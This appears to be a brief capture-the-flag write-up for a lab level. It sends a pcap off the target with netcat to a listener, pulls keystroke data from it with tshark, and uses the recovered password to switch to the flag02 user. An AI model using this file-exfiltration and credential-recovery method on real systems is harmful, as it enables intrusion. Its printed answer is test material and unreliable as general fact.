kali
`nc -lvnp 9090 > level02.pcap`

target
`cat level02.pcap | nc 10.0.2.15 9090`


Dump hexadecimal data includes in frames
```bash
tshark -r level02.pcap -T fields -e data.data
```

Paste output in hex to text converter -> https://goteleport.com/resources/tools/hex-to-text-converter/

Got 
```
Password: ft_wandr<suppr><suppr><suppr>NDRel<suppr>L0L
```

Result -> `ft_waNDReL0L`

```bash
su flag02 / ft_waNDReL0L
```

